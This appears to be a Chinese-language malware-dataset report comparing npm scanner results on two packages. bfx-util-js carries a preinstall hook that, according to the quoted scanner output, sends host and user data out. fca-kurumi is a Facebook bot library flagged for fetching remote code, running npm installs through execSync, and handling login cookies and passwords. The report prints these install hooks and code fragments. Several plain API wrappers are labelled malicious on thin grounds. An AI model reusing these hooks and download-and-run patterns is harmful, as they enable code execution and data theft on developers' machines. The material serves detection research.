**标注类型：** `npm-install-script`

**行为说明：** Executes index.js automatically before install, enabling arbitrary code execution.

**规避技术：** Abuses npm preinstall script to run hidden code before package installation.

**恶意代码：**
```javascript
"scripts":{
  "test":"echo \"error no test specified\" && exit 1",
  "preinstall":"node index.js"
},
```

**形式化行为：** arbitrary_command_execution

**形式化规避：** preinstall_hook_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 1
- **RF：** 1
- **XGB：** 1

#### GENIE

```
# 批量恶意代码查询结果
"theft-os","Query","error","[[""SOURCE""|""relative:///package/index.js:96:9:96:20""]] to [[""SINK""|""relative:///package/index.js:139:11:139:18""]] | Flow Count: 4 | Method Name: homedir
[[""SOURCE""|""relative:///package/index.js:97:9:97:21""]] to [[""SINK""|""relative:///package/index.js:139:11:139:18""]] | Flow Count: 4 | Method Name: hostname
[[""SOURCE""|""relative:///package/index.js:98:9:98:21""]] to [[""SINK""|""relative:///package/index.js:139:11:139:18""]] | Flow Count: 4 | Method Name: userInfo
[[""SOURCE""|""relative:///package/index.js:99:25:99:40""]] to [[""SINK""|""relative:///package/index.js:139:11:139:18""]] | Flow Count: 4 | Method Name: getServers","/package/index.js","139","11","139","18"
```

#### GUARDDOG

```
Found 3 potentially malicious indicators in /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/bfx-util-js/99.10.10/bfx-util-js-99.10.10.tgz

npm-exfiltrate-sensitive-data: found 2 source code matches
  * This package is exfiltrating sensitive data to a remote server at package/index.js:129
        var req = https.request(options, (res) => {
        res.on("data", (d) => {
            //process.stdout.write(d);
        });
    });
  * This package is exfiltrating sensitive data to a remote server at package/index.js:139
        req.write(postData);

npm-install-script: found 1 source code matches
  * The package.json has a script automatically running when the package is installed at package/package.json:8
        "preinstall":"node index.js"
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m15[0m[31m ]--[0m
   Rule Id: [34mBD000103[0m
       Tag: [34mSecurity.Backdoor.Setup.Script[0m
  Severity: [36mModerate[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/package.json[0m
   Pattern: [32m(pre|post|)install"\s*:\s*"node [^\s]+\.js[0m
[30;1m5 | [0m[35m  "main":"index.js",[0m
[30;1m6 | [0m[35m  "scripts":{[0m
[30;1m7 | [0m[35m  "test":"echo \"error no test specified\" && exit 1",[0m
[30;1m8 | [0m[35m  "preinstall":"node index.js"[0m
[30;1m9 | [0m[35m  },[0m
[30;1m10 | [0m[35m  "author":"",[0m
[30;1m11 | [0m[35m  "License":"ISC"[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m15[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/package/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m116 | [0m[35m});[0m
[30;1m117 | [0m
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "bfx-util-js",
  "version": "99.10.10",
  "total_files": 1,
  "analyzed_files": 1,
  "malicious_files": 1,
  "is_malicious": true,
  "analysis_date": "2025-07-11T19:24:10.656144"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/bfx-util-js/99.10.10/extracted_bfx-util-js-99.10.10.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/bfx-util-js/99.10.10/extracted_bfx-util-js-99.10.10.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 99.10.10[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mbitfinex whitehat package[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]

... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/bfx-util-js/99.10.10/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/bfx-util-js/99.10.10/package' from local_nodejs...[1m[32mPASS[0m [[34mver 99.10.10[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mbitfinex whitehat package[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking readme.........................[1m[3
... (truncated)
```

---

## 行为类别：Privilege Escalation

**包名：** `fca-kurumi`  
**版本：** `90.6.0`

### 代码上下文

#### 片段 1

**文件：** `package/index.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Downloads and executes remote code, collects credentials, performs auto-login, and manipulates local files and environment variables.

**规避技术：** 

**恶意代码：**
```javascript
'use strict';

process.env.UV_THREADPOOL_SIZE = require('os').cpus().length;

global.Fca = new Object({
    isThread: new Array(),
    isUser: new Array(),
    startTime: Date.now(),
    Setting: new Map(),
    Require: new Object({
        fs: require("fs"),
        Fetch: require('got'),
        log: require("npmlog"),
        utils: require("./utils"),
        logger: require('./logger'),
        Security: require("uuid-apikey"),
        languageFile: require('./Language/index.json'),
        Database: require("synthetic-horizon-database")
    }),
    getText: function(...Data) {
        var Main = (Data.splice(0,1)).toString();
            for (let i = 0; i < Data.length; i++) Main = Main.replace(RegExp(`%${i + 1}`, 'g'), Data[i]);
        return Main;
    },
    Data: new Object({
        ObjFastConfig: {
            "Language": "en",
            "PreKey": "",
            "AutoUpdate": true,
            "MainColor": "#9900FF",
            "MainName": "»Fhr-KURUMI!«",
            "Uptime": false,
            "Config": "default",
            "Login2Fa": false,
            "AutoLogin": false,
            "BroadCast": true,
            "AuthString": "SD4S XQ32 O2JA WXB3 FUX2 OPJ7 Q7JZ 4R6Z | https://i.imgur.com/RAg3rvw.png Please remove this !, Recommend If You Using getUserInfoV2",
            "EncryptFeature": true,
            "ResetDataLogin": false,
            "AutoRestartMinutes": 0,
            "HTML": {   
                "HTML": true,
                "UserName": "Guest",
                "MusicLink": ""
            }   
        },
        CountTime: function() {
            var fs = global.FB.Require.fs;
            if (fs.existsSync(__dirname + '/CountTime.json')) {
                try {
                    var data = Number(fs.readFileSync(__dirname + '/CountTime.json', 'utf8')),
                    hours = Math.floor(data / (60 * 60));
                }
                catch (e) {
                    fs.writeFileSync(__dirname + '/CountTime.json', 0);
                    hours = 0;
                }
            }
            else {
                hours = 0;
            }
            return `${hours} Hours`;
        }
    }),
    AutoLogin: async function () {
        var Database = global.Fca.Require.Database;
        var logger = global.Fca.Require.logger;
        var Email = (await global.Fca.Require.Database.get('Account')).replace(RegExp('"', 'g'), ''); //hmm IDK
        var PassWord = (await global.Fca.Require.Database.get('Password')).replace(RegExp('"', 'g'), '');
        login({ email: Email, password: PassWord},async (error, api) => {
            if (error) {
                logger.Error(JSON.stringify(error,null,2), function() { logger.Error("AutoLogin Failed!", function() { process.exit(0); }) });
            }
            try {
                await Database.set("TempState", api.getAppState());
            }
            catch(e) {
                logger.Warning(global.Fca.Require.Language.Index.ErrDatabase);
                    logger.Error();
                process.exit(0);
            }
            process.exit(1);
        });
    }
});

// ... [truncated for brevity] ...

mainPromise
    .then(function() {
        var { readFileSync } = require('fs-extra');
    const { execSync } = require('child_process');
Fetch('https://raw.githubusercontent.com/ChoruTiktokers182/fca-anjelo/main/package.json').then(async (res) => {
    const localVersion = JSON.parse(readFileSync('./node_modules/fca-anjelo-remake/package.json')).version;
        if (Number(localVersion.replace(/\./g,"")) < Number(JSON.parse(res.body.toString()).version.replace(/\./g,"")) ) {
            log.warn("[ FCA-ANJELO ] •",getText(Language.NewVersionFound,JSON.parse(readFileSync('./node_modules/fca-anaya-remake/package.json')).version,JSON.parse(res.body.toString()).version));
            if (global.Fca.Require.FastConfig.AutoUpdate == true) { 
                log.warn("[ FCA-ANJELO ] •",Language.AutoUpdate);
                    try {
                        execSync('npm install fca-anjelo-remake@latest', { stdio: 'inherit' });
                            logger.Success(Language.UpdateSuccess)
                                logger.Normal(Language.RestartAfterUpdate);
                                await new Promise(resolve => setTimeout(resolve,5*1000));
                            console.clear();process.exit(1);
                        }
                    catch (err) {
                        log.warn('Error Update: ' + err);
                            logger.Normal(Language.UpdateFailed);
                        try {
                            require.resolve('horizon-sp');
                        }
                        catch (e) {
                            logger.Normal(Language.InstallSupportTool);
                                execSync('npm install vegito-sp@latest', { stdio: 'inherit' });
                            process.exit(1);
                        }
                            var fcasp = require('horizon-sp');
                        try {
                            fcasp.onError()
                        }
                        catch (e) {
                            logger.Normal(Language.NotiAfterUseToolFail, "[ Fca - Helper ]")
                                logger.Normal("rmdir ./node_modules after type npm i && npm start","[ Fca - Helper ]");
                            process.exit(0);
                        }
                    }
                }
            }
        else {
            logger.Normal(getText(Language.LocalVersion,localVersion));
                logger.Normal(getText(Language.CountTime,global.Fca.Data.CountTime()))   
                    logger.Normal(Language.WishMessage[Math.floor(Math.random()*Language.WishMessage.length)]);
                    require('./Extra/ExtraUptimeRobot')();
                DataLanguageSetting.HTML.HTML==true? global.Fca.Require.Web.listen(global.Fca.Require.Web.get('DFP')) : global.Fca.Require.Web = null;
            callback(null, api);
        }
    });
}).catch(function(e) {
    log.error("login", e.error || e);
callback(e);
});

```

**形式化行为：** malicious_download, remote_code_execution, credential_theft, sensitive_data_collection, arbitrary_command_execution, file_cleanup, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, silent_error_handling, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/broadcast.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Downloads and executes remote JSON data, then logs or broadcasts its contents at regular intervals.

**规避技术：** 

**恶意代码：**
```javascript
switch (global.FB.Require.FastConfig.BroadCast) {
    case true: {
        try {
            var logger = global.FB.Require.logger;
                var Fetch = global.FB.Require.Fetch;
                    Fetch.get("https://raw.githubusercontent.com/ppcat123/Fca-fast.json/main/Fca-fast.json").then(async (/** @type {{ body: { toString: () => string; }; }} */ res) => {
                        global.FB.Data.BroadCast = JSON.parse(res.body.toString())
                    var random = JSON.parse(res.body.toString())[Math.floor(Math.random() * JSON.parse(res.body.toString()).length)] || "Ae Zui Zẻ Nhé !";
                logger.Normal(random);
            }); 
        }   
        catch (e) {
            console.log(e);
        }
        return setInterval(() => { 
            try {
                try {
                    var logger = global.Fca.Require.logger;
                        var random = global.FB.Data.BroadCast[Math.floor(Math.random() * global.Fca.Data.BroadCast.length)] || "Ae Zui Zẻ Nhé !";
                    logger.Normal(random);
                }   
                catch (e) {
                    console.log(e);
                    return;
                }
            }
            catch (e) {
                console.log(e);
            }
        },1800 * 1000);
    }
    case false: {
        break;
    }
    default: {
        break;
    }
}
```

**形式化行为：** malicious_download, runtime_caching

**形式化规避：** silent_error_handling, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/utils.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP requests, manages cookies, proxies, and collects/transmits authentication data; possible credential exfiltration risk.

**规避技术：** 

**恶意代码：**
```javascript
// Suspicious imports and network/file operations
var url = require("url");
var log = require("npmlog");
var stream = require("stream");
var bluebird = require("bluebird");
var querystring = require("querystring");
var request = bluebird.promisify(require("request").defaults({ jar: true }));

function setProxy(url) {
    if (typeof url == undefined) return request = bluebird.promisify(require("request").defaults({ jar: true }));
    return request = bluebird.promisify(require("request").defaults({ jar: true, proxy: url }));
}

function get(url, jar, qs, options, ctx) {
    if (getType(qs) === "Object")
        for (var prop in qs)
            if (qs.hasOwnProperty(prop) && getType(qs[prop]) === "Object") qs[prop] = JSON.stringify(qs[prop]);
    var op = {
        headers: getHeaders(url, options, ctx),
        timeout: 60000,
        qs: qs,
        url: url,
        method: "GET",
        jar: jar,
        gzip: true
    };
    return request(op).then(function(res) {
        return res;
    });
}

function post(url, jar, form, options, ctx, customHeader) {
    var op = {
        headers: getHeaders(url, options),
        timeout: 60000,
        url: url,
        method: "POST",
        form: form,
        jar: jar,
        gzip: true
    };
    return request(op).then(function(res) {
        return res;
    });
}

function postFormData(url, jar, form, qs, options, ctx) {
    var headers = getHeaders(url, options, ctx);
    headers["Content-Type"] = "multipart/form-data";
    var op = {
        headers: headers,
        timeout: 60000,
        url: url,
        method: "POST",
        formData: form,
        qs: qs,
        jar: jar,
        gzip: true
    };
    return request(op).then(function(res) {
        return res;
    });
}

function getAppState(jar, Encode) {
    var prettyMilliseconds = require('pretty-ms')
    var getText = globalThis.Fca.getText;
    var Security = require('./Extra/Security/Index');
    var appstate = jar.getCookies("https://www.facebook.com").concat(jar.getCookies("https://facebook.com")).concat(jar.getCookies("https://www.messenger.com"))
    var logger = require('./logger'),languageFile = require('./Language/index.json');
    var Language = languageFile.find(i => i.Language == globalThis.Fca.Require.FastConfig.Language).Folder.Index;
    var data;
        switch (require("../../FastConfigFca.json").EncryptFeature) {
            case true: {
                if (Encode == undefined) Encode = true;
                if (process.env['FBKEY'] != undefined && Encode) {
                    if(!globalThis.Fca.Setting.get('getAppState')) {
                        logger.Normal(Language.EncryptSuccess);
                        data = Security(JSON.stringify(appstate),process.env['FBKEY'],"Encrypt");
                        globalThis.Fca.Setting.set('AppState', data);
                    }
                    else {
                        data = globalThis.Fca.Setting.get('AppState');
                    }
                }
                else return appstate;
            }
                break;
            case false: {
                data = appstate;
            }
                break;
            default: {
                logger.Normal(getText(Language.IsNotABoolean,require("../../FastConfigFca.json").EncryptFeature));
                data = appstate;
            } 
        }
            if(!globalThis.Fca.Setting.get('getAppState')) {
                logger.Normal(getText(Language.ProcessDone,`${prettyMilliseconds(Date.now() - globalThis.Fca.startTime)}`),function() { globalThis.Fca.Setting.set('getAppState',true) });
            }
    return data;
}

function parseAndCheckLogin(ctx, defaultFuncs, retryCount) {
    if (retryCount == undefined) retryCount = 0;
    return function(data) {
        return bluebird.try(function() {
            log.verbose("parseAndCheckLogin", data.body);
            if (data.statusCode >= 500 && data.statusCode < 600) {
                if (retryCount >= 5) {
                    throw {
                        error: "Request retry failed. Check the `res` and `statusCode` property on this error.",
                        statusCode: data.statusCode,
                        res: data.body
                    };
                }
                retryCount++;
                var retryTime = Math.floor(Math.random() * 5000);
                log.warn("parseAndCheckLogin", "Got status code " + data.statusCode + " - " + retryCount + ". attempt to retry in " + retryTime + " milliseconds...");
                var url = data.request.uri.protocol + "//" + data.request.uri.hostname + data.request.uri.pathname;
                if (data.request.headers["Content-Type"].split(";")[0] === "multipart/form-data") {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.postFormData(url, ctx.jar, data.request.formData, {}))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                } else {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.post(url, ctx.jar, data.request.formData))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                }
            }
            if (data.statusCode !== 200) throw new Error("parseAndCheckLogin got status code: " + data.statusCode + ". Bailing out of trying to parse response.");
            var res = null;
            try {
                res = JSON.parse(makeParsable(data.body));
            } catch (e) {
                throw {
                    error: "JSON.parse error. Check the `detail` property on this error.",
                    detail: e,
                    res: data.body
                };
            }
            if (res.redirect && data.request.method === "GET") return defaultFuncs.get(res.redirect, ctx.jar).then(parseAndCheckLogin(ctx, defaultFuncs));
            if (res.jsmods && res.jsmods.require && Array.isArray(res.jsmods.require[0]) && res.jsmods.require[0][0] === "Cookie") {
                res.jsmods.require[0][3][0] = res.jsmods.require[0][3][0].replace("_js_", "");
                var cookie = formatCookie(res.jsmods.require[0][3], "facebook");
                var cookie2 = formatCookie(res.jsmods.require[0][3], "messenger");
                ctx.jar.setCookie(cookie, "https://www.facebook.com");
                ctx.jar.setCookie(cookie2, "https://www.messenger.com");
            }
            if (res.jsmods && Array.isArray(res.jsmods.require)) {
                var arr = res.jsmods.require;
                for (var i in arr) {
                    if (arr[i][0] === "DTSG" && arr[i][1] === "setToken") {
                        ctx.fb_dtsg = arr[i][3][0];
                        ctx.ttstamp = "2";
                        for (var j = 0; j < ctx.fb_dtsg.length; j++) ctx.ttstamp += ctx.fb_dtsg.charCodeAt(j);
                    }
                }
            }
            if (res.error === 1357001) {
                switch (globalThis.Fca.Require.FastConfig.AutoLogin) {
                    case true: {
                        globalThis.Fca.Require.logger.Warning(globalThis.Fca.Require.Language.Index.AutoLogin, function() {
                            return globalThis.Fca.AutoLogin();
                        });
                        break;
                    }
                    case false: {
                        throw { error: globalThis.Fca.Require.Language.Index.ErrAppState };
                    }
                }
            }
            else return res;
        });
    };
}

function saveCookies(jar) {
    return function(res) {
        var cookies = res.headers["set-cookie"] || [];
        cookies.forEach(function(c) {
            if (c.indexOf(".facebook.com") > -1) {
                jar.setCookie(c, "https://www.facebook.com");
                jar.setCookie(c.replace(/domain=\.facebook\.com/, "domain=.messenger.com"), "https://www.messenger.com");
            }
        });
        return res;
    };
}
// ... [truncated for brevity] ...
```

**形式化行为：** sensitive_data_collection, credential_theft, data_exfiltration, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 4

**文件：** `package/deleteMessage.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends HTTP POST requests to Facebook to delete messages; could be abused for unauthorized message deletion.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function deleteMessage(messageOrMessages, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });
    if (!callback) {
      callback = function (err) {
        if (err) return rejectFunc(err);

        resolveFunc();
      };
    }

    var form = {
      client: "mercury"
    };

    if (utils.getType(messageOrMessages) !== "Array") messageOrMessages = [messageOrMessages];

    for (var i = 0; i < messageOrMessages.length; i++) form["message_ids[" + i + "]"] = messageOrMessages[i];

    defaultFuncs
      .post("https://www.facebook.com/ajax/mercury/delete_messages.php", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;

        return callback();
      })
      .catch(function (err) {
        log.error("deleteMessage", err);
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** legitimate_api_abuse, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 5

**文件：** `package/forwardAttachment.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends HTTP POST requests with user-supplied data to Facebook; could be abused for data exfiltration or spam.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function forwardAttachment(attachmentID, userOrUsers, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });
    if (!callback) {
      callback = function (err) {
        if (err) return rejectFunc(err);
        resolveFunc();
      };
    }

    var form = {
      attachment_id: attachmentID
    };

    if (utils.getType(userOrUsers) !== "Array") userOrUsers = [userOrUsers];

    var timestamp = Math.floor(Date.now() / 1000);

    //That's good, the key of the array is really timestmap in seconds + index
    //Probably time when the attachment will be sent?
    for (var i = 0; i < userOrUsers.length; i++) form["recipient_map[" + (timestamp + i) + "]"] = userOrUsers[i];

    defaultFuncs
      .post("https://www.facebook.com/mercury/attachments/forward/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx.jar, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;

        return callback();
      })
      .catch(function (err) {
        log.error("forwardAttachment", err);
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 6

**文件：** `package/markAsReadAll.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook, potentially automating inbox actions; could be abused for unauthorized message state changes.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function markAsReadAll(callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);

        resolveFunc(data);
      };
    }

    var form = {
      folder: 'inbox'
    };

    defaultFuncs
      .post("https://www.facebook.com/ajax/mercury/mark_folder_as_read.php", ctx.jar, form)
      .then(utils.saveCookies(ctx.jar))
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;

        return callback();
      })
      .catch(function (err) {
        log.error("markAsReadAll", err);
        return callback(err);
      });

    return returnPromise;
  };
};
```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 7

**文件：** `package/getUserInfoV4.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends user IDs to Facebook GraphQL API and processes returned user data, potentially collecting or exposing user information.

**规避技术：** 

**恶意代码：**
```javascript
var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
    return function getUserInfoV4(id, callback) {
        var resolveFunc = function () { };
        var rejectFunc = function () { };
        var returnPromise = new Promise(function (resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });
    
        if (!callback) {
            callback = function (err, userInfo) {
            if (err) return rejectFunc(err);
            resolveFunc(userInfo);
            };
        }

        if (utils.getType(id) !== "Array") id = [id];

    var form = {
        av: ctx.userID,
        fb_api_caller_class: "RelayModern",
        fb_api_req_friendly_name: "PresenceStatusProviderSubscription_ContactProfilesQuery",
        variables: JSON.stringify({
            ids: id
        }),
        doc_id: 7188178894556645
    };
    console.log(form)
try {
        defaultFuncs
            .post("https://www.facebook.com/api/graphql/", ctx.jar, form)
            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
            .then(function (resData) {
            if (resData.error) throw resData;
                callback(null,resData.data.viewer.chat_sidebar_contact_nodes[0])
            })
            .catch(function (err) {
                console.log(err)
                log.error("getUserInfo", "Lỗi: getUserInfo Có Thể Do Bạn Spam Quá Nhiều !,Hãy Thử Lại !");
                return callback(err);
            });
    }
    catch (e) {
        return callback(null, e);
    }
    return returnPromise;
    };
};
```

**形式化行为：** sensitive_data_collection, data_exfiltration, legitimate_api_abuse, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 8

**文件：** `package/changeGroupImage.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Uploads images and posts data to Facebook endpoints; network activity and data transmission present.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");
var bluebird = require("bluebird");

module.exports = function (defaultFuncs, api, ctx) {
  function handleUpload(image, callback) {
    var uploads = [];

    var form = {
      images_only: "true",
      "attachment[]": image
    };

    uploads.push(
      defaultFuncs
        .postFormData("https://upload.facebook.com/ajax/mercury/upload.php", ctx.jar, form, {})
        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
        .then(function (resData) {
          if (resData.error) throw resData;

          return resData.payload.metadata[0];
        })
    );

    // resolve all promises
    bluebird
      .all(uploads)
      .then(resData => callback(null, resData))
      .catch(function (err) {
        log.error("handleUpload", err);
        return callback(err);
      });
  }

  return function changeGroupImage(image, threadID, callback) {
    if (!callback && (utils.getType(threadID) === "Function" || utils.getType(threadID) === "AsyncFunction")) throw { error: "please pass a threadID as a second argument." };

    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err) {
        if (err) return rejectFunc(err);
        resolveFunc();
      };
    }

    var messageAndOTID = utils.generateOfflineThreadingID();
    var form = {
      client: "mercury",
      action_type: "ma-type:log-message",
      author: "fbid:" + ctx.userID,
      author_email: "",
      ephemeral_ttl_mode: "0",
      is_filtered_content: false,
      is_filtered_content_account: false,
      is_filtered_content_bh: false,
      is_filtered_content_invalid_app: false,
      is_filtered_content_quasar: false,
      is_forward: false,
      is_spoof_warning: false,
      is_unread: false,
      log_message_type: "log:thread-image",
      manual_retry_cnt: "0",
      message_id: messageAndOTID,
      offline_threading_id: messageAndOTID,
      source: "source:chat:web",
      "source_tags[0]": "source:chat",
      status: "0",
      thread_fbid: threadID,
      thread_id: "",
      timestamp: Date.now(),
      timestamp_absolute: "Today",
      timestamp_relative: utils.generateTimestampRelative(),
      timestamp_time_passed: "0"
    };

    handleUpload(image, function (err, payload) {
      if (err) return callback(err);

      form["thread_image_id"] = payload[0]["image_id"];
      form["thread_id"] = threadID;

      defaultFuncs
        .post("https://www.facebook.com/messaging/set_thread_image/", ctx.jar, form)
        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
        .then(function (resData) {
          // check for errors here
          if (resData.error) throw resData;
          return callback();
        })
        .catch(function (err) {
          log.error("changeGroupImage", err);
          return callback(err);
        });
    });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access, data_exfiltration

**形式化规避：** legitimate_api_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 9

**文件：** `package/httpPostFormData.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST requests with form data; could be used for data exfiltration or unauthorized network communication.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function(defaultFuncs, api, ctx) {
  return function httpPostFormData(url, form, callback) {
    var resolveFunc = function(){};
    var rejectFunc = function(){};

    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

